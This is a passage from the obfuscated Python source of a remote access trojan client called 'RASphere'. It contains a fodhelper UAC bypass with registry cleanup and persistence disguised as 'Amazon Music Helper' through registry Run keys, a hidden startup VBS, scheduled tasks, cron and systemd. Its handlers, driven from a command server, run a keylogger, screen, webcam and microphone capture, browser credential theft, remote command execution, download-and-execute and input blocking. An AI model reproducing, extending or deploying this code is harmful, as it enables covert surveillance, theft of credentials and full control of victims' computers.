        _l.error(f"UAC bypass failed: {e}")
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        return False
def _cleanup_uac_registry():
    ""_D("_s260")""
    try:
        import winreg as wr
        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
        try:
            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
            try:
                wr.DeleteValue(key, _D("_s261"))
            except:
                pass
            try:
                wr.DeleteValue(key, "")
            except:
                pass
            wr.CloseKey(key)
        except:
            pass
        try:
            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
        except:
            pass
        for p in [r"Software\Classes\ms-settings\Shell\open",
                  r"Software\Classes\ms-settings\Shell",
                  r"Software\Classes\ms-settings"]:
            try:
                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
            except:
                pass
        _l.info(_D("_s262"))
    except Exception as e:
        _l.debug(f"UAC cleanup (non-critical): {e}")
_keepalive_stop = threading.Event()
def _keepalive_pinger(server_url):
    ""_D("_s263")""
    import urllib.request
    health_url = server_url.rstrip("/") + _D("_s264")
    while not _keepalive_stop.is_set():
        _keepalive_stop.wait(_KEEPALIVE)
        if _keepalive_stop.is_set():
            break
        try:
            urllib.request.urlopen(health_url, timeout=10)
            _l.debug(_D("_s265"))
        except Exception as e:
            _l.debug(f"Keep-alive ping failed: {e}")
def _exepath():
    if getattr(sys, _D("_s266"), False): return sys.executable
    return os.path.abspath(sys.argv[0])
def _pdir():
    if sys.platform == _D("_s267"):
        b = os.environ.get(_D("_s268"), os.path.expanduser("~"))
        p = os.path.join(b, _D("_s269"))
    else:
        p = os.path.expanduser(_D("_s270"))
    os.makedirs(p, exist_ok=True)
    return p
def _ip(url, secret, rec, cid):
    ep = _exepath(); pd = _pdir()
    dest = os.path.join(pd, _D("_s271") if sys.platform == "win32" else "amazonmusicd")
    if ep != dest:
        try: shutil.copy2(ep, dest); _l.info(f"Copied: {dest}")
        except Exception as e: _l.warning(f"Copy fail: {e}"); dest = ep
    ca = [dest, _D("_s272"), url or _SERVER, "--secret", secret or _SECRET, "--reconnect", str(rec or _RECON), "--no-persist"]
    if cid: ca += [_D("_s273"), cid]
    cl = subprocess.list2cmdline(ca)
    ok = False
    if sys.platform == _D("_s274"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k, _D("_s275"), 0, winreg.REG_SZ, cl); winreg.CloseKey(k); _l.info("Installed: Registry"); ok = True
        except Exception as e: _l.warning(f"Reg fail: {e}")
        try:
            sd = os.path.join(os.environ.get(_D("_s276"),""), "Microsoft","Windows","Start Menu","Programs","Startup")
            if os.path.exists(sd):
                vp = os.path.join(sd, _D("_s277"))
                with open(vp, "w") as f: f.write(f'CreateObject("WScript.Shell").Run "{cl.replace(chr(34), chr(34)+chr(34))}", 0, False')
                _l.info(_D("_s278")); ok = True
        except Exception as e: _l.warning(f"VBS fail: {e}")
        try:
            subprocess.run([_D("_s279"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            r = subprocess.run([_D("_s280"),"/Create","/TN","AmazonMusicHelper","/TR",cl,"/SC","ONLOGON","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if r.returncode == 0: _l.info(_D("_s281")); ok = True
        except Exception as e: _l.warning(f"Task fail: {e}")
    else:
        try:
            cline = f"@reboot {cl} > /dev/null 2>&1 &"
            ex = subprocess.run([_D("_s282"),"-l"], capture_output=True, text=True)
            ct = (ex.stdout or "")
            if _D("_s283") not in ct:
                ct += f"\n
                subprocess.run([_D("_s284"),"-"], input=ct, text=True)
                _l.info(_D("_s285")); ok = True
        except Exception as e: _l.warning(f"Cron fail: {e}")
        try:
            sd = os.path.expanduser(_D("_s286")); os.makedirs(sd, exist_ok=True)
            sc = f"[Unit]\nDescription=Amazon Music Helper\nAfter=network.target\n\n[Service]\nExecStart={cl}\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=default.target\n"
            with open(os.path.join(sd, _D("_s287")), "w") as f: f.write(sc)
            subprocess.run([_D("_s288"),"--user","daemon-reload"], capture_output=True)
            subprocess.run([_D("_s289"),"--user","enable","amazonmusic-helper"], capture_output=True)
            _l.info(_D("_s290")); ok = True
        except Exception as e: _l.warning(f"systemd fail: {e}")
    return ok
def _up():
    ok = False
    if sys.platform == _D("_s291"):
        try:
            import winreg
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            try: winreg.DeleteValue(k, _D("_s292")); ok = True
            except FileNotFoundError: pass
            winreg.CloseKey(k)
        except: pass
        try:
            vp = os.path.join(os.environ.get(_D("_s293"),""), "Microsoft","Windows","Start Menu","Programs","Startup","AmazonMusicHelper.vbs")
            if os.path.exists(vp): os.remove(vp); ok = True
        except: pass
        try: subprocess.run([_D("_s294"),"/Delete","/TN","AmazonMusicHelper","/F"], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW); ok = True
        except: pass
    else:
        try:
            ex = subprocess.run([_D("_s295"),"-l"], capture_output=True, text=True)
            if ex.stdout and _D("_s296") in ex.stdout:
                nc = "\n".join(l for l in ex.stdout.split("\n")                    if _D("_s297") not in l)
                subprocess.run([_D("_s298"),"-"], input=nc, text=True); ok = True
        except: pass
        try:
            sp = os.path.expanduser(_D("_s299"))
            if os.path.exists(sp):
                subprocess.run([_D("_s300"),"--user","disable","amazonmusic-helper"], capture_output=True)
                os.remove(sp); subprocess.run([_D("_s301"),"--user","daemon-reload"], capture_output=True); ok = True
        except: pass
    try:
        pd = _pdir()
        for f in os.listdir(pd):
            try: os.remove(os.path.join(pd, f))
            except: pass
        try: os.rmdir(pd)
        except: pass
    except: pass
    return ok
def _sh(sio):
    sc = CapEngine(sio, _D("_s302"))
    wc = CapEngine(sio, _D("_s303"))
    mic = MicEngine(sio)
    mon = SysMon(sio)
    term = Term(sio)
    keylog = Keylog(sio)
    _s.scap = sc; _s.wcap = wc; _s.mic = mic; _s.keylog = keylog
    @sio.on(_D("_s304"))
    def _c():
        _l.info(_D("_s305")); _s.conn = True
        sio.emit(_D("_s306"), {"secret": _s.secret, "client_id": _s.cid,
            _D("_s307"): {"hostname": socket.gethostname(), "platform": sys.platform,
                _D("_s308"): os.environ.get("USERNAME", os.environ.get("USER","?")),
                _D("_s309"): {"screen": HAS["mss"], "input": HAS["pynput"], "clipboard": HAS["pyperclip"],
                    _D("_s310"): HAS["pycaw"], "monitor": HAS["psutil"], "terminal": True, "webcam": _h6}}})
    @sio.on(_D("_s311"))
    def _d():
        _block_input(False)  
        _l.info(_D("_s312")); _s.conn = False; _s.reg = False; sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop()
    @sio.on(_D("_s313"))
    def _r(d): _s.reg = True; _s.cid = d.get(_D("_s314"), _s.cid); _l.info(f"Registered: {_s.cid}")
    @sio.on(_D("_s315"))
    def _sc(d=None):
        if d and _D("_s316") in d: sc.monitor_idx = int(d.get("monitor", 1))
        sc.start(); sio.emit(_D("_s317"), {"active": True})
    @sio.on(_D("_s318"))
    def _sc2(): sc.stop(); sio.emit(_D("_s319"), {"active": False})
    @sio.on(_D("_s320"))
    def _smn(d):
        if d and _D("_s321") in d:
            sc.monitor_idx = int(d[_D("_s322")])
            was_running = sc.r
            if was_running:
                sc.stop()
                sc.start()
                sio.emit(_D("_s323"), {"active": True})
    @sio.on(_D("_s324"))
    def _sq(d):
        if d:
            if _D("_s325") in d: sc.q = max(1, min(100, int(d["quality"])))
            if _D("_s326") in d: sc.sc = max(0.1, min(1.0, float(d["scale"])))
            if "fps" in d: sc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s327"))
    def _wc(d=None): wc.start(); sio.emit(_D("_s328"), {"active": True})
    @sio.on(_D("_s329"))
    def _wc2(): wc.stop(); sio.emit(_D("_s330"), {"active": False})
    @sio.on(_D("_s331"))
    def _wq(d):
        if d:
            if _D("_s332") in d: wc.q = max(1, min(100, int(d["quality"])))
            if "fps" in d: wc.fps = max(1, min(30, int(d["fps"])))
    @sio.on(_D("_s333"))
    def _mstart(d=None): mic.start()
    @sio.on(_D("_s334"))
    def _mstop(): mic.stop(); sio.emit(_D("_s335"), {"active": False})
    @sio.on(_D("_s336"))
    def _kstart(d=None): keylog.start()
    @sio.on(_D("_s337"))
    def _kstop(): keylog.stop()
    @sio.on(_D("_s338"))
    def _me(d):
        if not HAS[_D("_s339")] or not _s.mc: return
        try:
            a = d.get(_D("_s340"),"")
            if a == _D("_s341"): _s.mc.position = (int(d.get("x",0)*_s.sw), int(d.get("y",0)*_s.sh))
            elif a == _D("_s342"): _s.mc.move(int(d.get("dx",0)), int(d.get("dy",0)))
            elif a == _D("_s343"):
                bm = {_D("_s344"): MB.left, "right": MB.right, "middle": MB.middle}
                _s.mc.click(bm.get(d.get(_D("_s345"),"left").lower(), MB.left), 2 if d.get("double") else 1)
            elif a == _D("_s346"): _s.mc.press({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s347"): _s.mc.release({"left": MB.left, "right": MB.right, "middle": MB.middle}.get(d.get("button","left").lower(), MB.left))
            elif a == _D("_s348"): _s.mc.scroll(int(d.get("dx",0)), int(d.get("dy",0)))
        except Exception as e: _l.error(f"Mouse err: {e}")
    @sio.on(_D("_s349"))
    def _ke(d):
        if not HAS[_D("_s350")] or not _s.kc: return
        try:
            SP = {_D("_s351"): Key.ctrl, "alt": Key.alt, "shift": Key.shift, "win": Key.cmd, "cmd": Key.cmd, "super": Key.cmd,
                  "tab": Key.tab, _D("_s352"): Key.enter, "esc": Key.esc, "space": Key.space, "backspace": Key.backspace,
                  _D("_s353"): Key.delete, "home": Key.home, "end": Key.end, "page_up": Key.page_up, "page_down": Key.page_down,
                  "up": Key.up, _D("_s354"): Key.down, "left": Key.left, "right": Key.right,
                  **{f"f{i}": getattr(Key, f"f{i}") for i in range(1,13)}}
            def rk(k): k = k.lower(); return SP.get(k, KeyCode.from_char(k))
            a = d.get(_D("_s355"),"")
            if a == _D("_s356"): _s.kc.press(rk(d.get("key","")))
            elif a == _D("_s357"): _s.kc.release(rk(d.get("key","")))
            elif a == _D("_s358"):
                ks = [rk(k) for k in d.get(_D("_s359"),[])]
                for k in ks: _s.kc.press(k)
                for k in reversed(ks): _s.kc.release(k)
            elif a == _D("_s360"): _s.kc.type(d.get("text",""))
            elif a == _D("_s361"):
                scs = {_D("_s362"): ([Key.ctrl, Key.alt], Key.delete), "ctrl_shift_esc": ([Key.ctrl, Key.shift], Key.esc),
                       _D("_s363"): ([Key.alt], Key.tab), "alt_f4": ([Key.alt], Key.f4),
                       _D("_s364"): ([Key.cmd], KeyCode.from_char("d")), "win_r": ([Key.cmd], KeyCode.from_char("r")),
                       _D("_s365"): ([Key.cmd], KeyCode.from_char("e")), "win_l": ([Key.cmd], KeyCode.from_char("l")),
                       _D("_s366"): ([Key.ctrl], KeyCode.from_char("c")), "ctrl_v": ([Key.ctrl], KeyCode.from_char("v")),
                       _D("_s367"): ([Key.ctrl], KeyCode.from_char("x")), "ctrl_z": ([Key.ctrl], KeyCode.from_char("z")),
                       _D("_s368"): ([Key.ctrl], KeyCode.from_char("a")), "ctrl_s": ([Key.ctrl], KeyCode.from_char("s"))}
                sc = scs.get(d.get(_D("_s369"),""))
                if sc:
                    for m in sc[0]: _s.kc.press(m)
                    _s.kc.press(sc[1]); _s.kc.release(sc[1])
                    for m in reversed(sc[0]): _s.kc.release(m)
        except Exception as e: _l.error(f"Key err: {e}")
    @sio.on(_D("_s370"))
    def _ts(): ok = term.start(); sio.emit(_D("_s371"), {"active": ok})
    @sio.on(_D("_s372"))
    def _ti(d): term.write((d or {}).get(_D("_s373"),""))
    @sio.on(_D("_s374"))
    def _tst(): term.stop(); sio.emit(_D("_s375"), {"active": False})
    @sio.on(_D("_s376"))
    def _sm(): mon.start(); sio.emit(_D("_s377"), {"active": True})
    @sio.on(_D("_s378"))
    def _sm2(): mon.stop(); sio.emit(_D("_s379"), {"active": False})
    @sio.on(_D("_s380"))
    def _gp(): sio.emit(_D("_s381"), {"processes": _proc()})
    @sio.on(_D("_s382"))
    def _kp(d): pid = (d or {}).get("pid"); ok, msg = _kill(pid); sio.emit(_D("_s383"), {"ok": ok, "message": msg, "pid": pid})
    @sio.on(_D("_s384"))
    def _cg():
        if HAS[_D("_s385")]:
            try: sio.emit(_D("_s386"), {"text": pyperclip.paste()})
            except Exception as e: sio.emit(_D("_s387"), {"error": str(e)})
        else: sio.emit(_D("_s388"), {"error": "N/A"})
    @sio.on(_D("_s389"))
    def _cs(d):
        if HAS[_D("_s390")]:
            try: pyperclip.copy((d or {}).get(_D("_s391"),"")); sio.emit("clipboard_status", {"ok": True})
            except Exception as e: sio.emit(_D("_s392"), {"ok": False, "error": str(e)})
        else: sio.emit(_D("_s393"), {"ok": False, "error": "N/A"})
    @sio.on(_D("_s394"))
    def _ag(): r = _audio(); sio.emit(_D("_s395"), r or {"error": "N/A"})
    @sio.on(_D("_s396"))
    def _as(d): lv = (d or {}).get(_D("_s397"),50); ok = _avol(int(lv)); sio.emit("audio_status", {"ok": ok, "volume": int(lv)})
    @sio.on(_D("_s398"))
    def _am(): ok = _amute(); r = _audio(); sio.emit(_D("_s399"), r or {"error": "N/A"})
    @sio.on(_D("_s400"))
    def _pmo(): ok = _monoff(); sio.emit(_D("_s401"), {"action": "monitor_off", "ok": ok})
    @sio.on(_D("_s402"))
    def _pl(): ok = _lock(); sio.emit(_D("_s403"), {"action": "lock", "ok": ok})
    @sio.on(_D("_s404"))
    def _ps(): ok = _sleep(); sio.emit(_D("_s405"), {"action": "sleep", "ok": ok})
    @sio.on(_D("_s406"))
    def _wp(d): ok, msg = _wallpaper((d or {}).get(_D("_s407"),"")); sio.emit("cmd_result", {"cmd": "wallpaper", "ok": ok, "message": msg})
    @sio.on(_D("_s408"))
    def _mb(d): ok, msg = _msgbox((d or {}).get(_D("_s409"),"RASphere"), (d or {}).get("text","Hello!")); sio.emit("cmd_result", {"cmd": "msgbox", "ok": ok, "message": msg})
    @sio.on(_D("_s410"))
    def _ou(d): ok, msg = _openurl((d or {}).get("url","")); sio.emit(_D("_s411"), {"cmd": "openurl", "ok": ok, "message": msg})
    @sio.on(_D("_s412"))
    def _tss(): data, fmt = _screenshot(); sio.emit(_D("_s413"), {"data": data, "format": fmt} if data else {"error": fmt})
    @sio.on(_D("_s414"))
    def _geo(): sio.emit(_D("_s415"), _geoip())
    @sio.on(_D("_s416"))
    def _ga(): sio.emit(_D("_s417"), {"apps": _apps()})
    @sio.on(_D("_s418"))
    def _psnd(d): ok, msg = _play_sound((d or {}).get(_D("_s419"),800), (d or {}).get("dur",1)); sio.emit("cmd_result", {"cmd": "sound", "ok": ok, "message": msg})
    @sio.on(_D("_s420"))
    def _sf(d): r = _search_files((d or {}).get(_D("_s421"),"C:\\"), (d or {}).get("pattern","*"), (d or {}).get("max",50)); sio.emit("search_result", {"results": r})
    @sio.on(_D("_s422"))
    def _ec(d): out, rc = _execute_command((d or {}).get(_D("_s423"),"")); sio.emit("execute_result", {"output": out, "code": rc})
    @sio.on(_D("_s424"))
    def _de(d): ok, msg = _download_exec((d or {}).get("url",""), (d or {}).get(_D("_s425"))); sio.emit("cmd_result", {"cmd": "download_exec", "ok": ok, "message": msg})
    @sio.on(_D("_s426"))
    def _ib(d=None): ok, msg = _block_input(True); sio.emit(_D("_s427"), {"cmd": "input_block", "ok": ok, "message": msg})
    @sio.on(_D("_s428"))
    def _iub(d=None): ok, msg = _block_input(False); sio.emit(_D("_s429"), {"cmd": "input_unblock", "ok": ok, "message": msg})
    @sio.on(_D("_s430"))
    def _fl(d): sio.emit(_D("_s431"), _flist((d or {}).get("path","")))
    @sio.on(_D("_s432"))
    def _fdr(d): sio.emit(_D("_s433"), {**_fread((d or {}).get("path",""), (d or {}).get("offset",0)), "path": (d or {}).get("path","")})
    @sio.on(_D("_s434"))
    def _fd(d): ok, msg = _fdel((d or {}).get(_D("_s435"),"")); sio.emit("file_delete_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s436"))
    def _fnf(d): ok, msg = _fmkdir((d or {}).get(_D("_s437"),""), (d or {}).get("name","New Folder")); sio.emit("file_new_folder_result", {"ok": ok, "message": msg})
    @sio.on(_D("_s438"))
    def _fuc(d):
        path = (d or {}).get(_D("_s439"),""); chunk = (d or {}).get("data",""); offset = (d or {}).get("offset",0)
        mode = "wb" if offset == 0 else "ab"
        ok, msg = _fwrite(path, chunk, offset, mode)
        sio.emit(_D("_s440"), {"ok": ok, "message": msg, "path": path})
    @sio.on(_D("_s441"))
    def _ninfo(d=None): sio.emit(_D("_s442"), _network_info())
    @sio.on(_D("_s443"))
    def _bs(d=None):
        _l.info(_D("_s444"))
        result = _browser_steal()
        sio.emit(_D("_s445"), result)
    @sio.on(_D("_s446"))
    def _ks(d=None):
        _l.warning(_D("_s447")); sc.stop(); wc.stop(); mic.stop(); mon.stop(); term.stop(); keylog.stop(); sio.disconnect(); os._exit(0)
def main():
    p = argparse.ArgumentParser(description=_D("_s448"))
    p.add_argument(_D("_s449"), default=None, help=f"Server URL (default: {_SERVER})")
    p.add_argument(_D("_s450"), default=None, help=f"Client secret (default: ***)")
    p.add_argument(_D("_s451"), default=None, help="Client ID (default: auto)")
    p.add_argument(_D("_s452"), type=int, default=None, help=f"Reconnect delay (default: {_RECON}s)")
    p.add_argument(_D("_s453"), action="store_true", help="Install persistence")
    p.add_argument(_D("_s454"), action="store_true", help="Remove persistence")
    p.add_argument(_D("_s455"), action="store_true", help="Skip auto-persistence")
    p.add_argument(_D("_s456"), action="store_true", help=argparse.SUPPRESS)
    p.add_argument(_D("_s457"), action="store_true", help="Skip UAC bypass on startup")
    args = p.parse_args()
    url = args.server or _SERVER; secret = args.secret or _SECRET
    rec = args.reconnect if args.reconnect is not None else _RECON
    cid = args.id or _CLIENT_ID
    if args.uninstall:
        if _up(): print(_D("_s458"))
        else: print(_D("_s459"))
        return
    if args.install:
        if not url or not secret: print(_D("_s460")); sys.exit(1)
        if _ip(url, secret, rec, cid): print(_D("_s461"))
        else: print(_D("_s462"))
    if sys.platform == _D("_s463") and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
        if not _is_admin():
            _l.info(_D("_s464"))
            _fodhelper_uac_bypass(args)
            print(_D("_s465"))
        else:
            _l.info(_D("_s466"))
    if getattr(args, _D("_s467"), False):
        _l.info(_D("_s468"))
        _cleanup_uac_registry()
    if not args.no_persist and not args.uninstall:
        try:
            if url and secret:
                ok = _ip(url, secret, rec, cid)
                if ok: print(_D("_s469"))
                else: print(_D("_s470"))
        except Exception as e: print(f"[!] Auto-persist error: {e}")
    if not url: print(_D("_s471")); sys.exit(1)
    if not secret: print(_D("_s472")); sys.exit(1)
    _s.url = url.rstrip("/"); _s.secret = secret
    _s.cid = cid or f"{socket.gethostname()}-{os.urandom(3).hex()}"
    _l.info(f"RASphere Client | ID: {_s.cid} | Server: {_s.url}")
    sio = sio_lib.Client(reconnection=True, reconnection_attempts=0, reconnection_delay=rec,
                          reconnection_delay_max=30, _l=False, engineio_logger=False)
    _sh(sio); _s.sio = sio
    threading.Thread(target=_keepalive_pinger, args=(_s.url,), daemon=True).start()
    update_checked = False
    current_delay = rec  
    while True:
        try:
            _l.info(f"Connecting to {_s.url}...")
            sio.connect(_s.url, wait_timeout=10)
            _l.info(_D("_s473"))
            current_delay = rec
            if not update_checked:
                new_ver, dl_url = _check_for_update(_s.url)
                update_checked = True
                if new_ver and dl_url:
                    _l.info(f"New version {new_ver} available, applying update...")
                    ok = _download_and_install(dl_url, new_ver)
                    if ok:
                        _l.info(_D("_s474"))
                        sio.disconnect()
                        os._exit(0)
            sio.wait()
        except KeyboardInterrupt: _l.info(_D("_s475")); break
        except Exception as e:
            _l.error(f"Connection error: {e}")
            if not rec: break
            _l.info(f"Reconnecting in {current_delay}s...")
            time.sleep(current_delay)
            current_delay = min(current_delay * 2, _RECON_MAX)
    sio.disconnect(); _l.info(_D("_s476"))
if __name__ == _D("_s477"): main()
